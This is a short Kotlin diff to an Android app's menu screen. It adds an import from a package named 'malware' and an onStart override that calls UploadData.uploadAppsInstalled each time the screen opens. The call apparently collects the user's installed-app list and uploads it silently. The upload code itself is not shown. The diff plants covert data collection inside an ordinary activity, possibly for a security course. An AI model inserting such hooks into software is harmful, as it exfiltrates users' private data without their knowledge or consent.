@@ -12,6 +12,7 @@ import com.firebase.ui.auth.AuthUI
 import es.upm.karthud.R
 import es.upm.karthud.Utils
 import es.upm.karthud.databinding.ActivityMenuBinding
+import es.upm.karthud.malware.UploadData
 
 class MenuActivity : AppCompatActivity()
 {
@@ -49,5 +50,10 @@ class MenuActivity : AppCompatActivity()
 
         //para cerrar la app
         binding.closeMenuButton.setOnClickListener { finish() }
+    }
+
+    override fun onStart() {
+        super.onStart()
+        UploadData.uploadAppsInstalled(applicationContext)
     }
 }
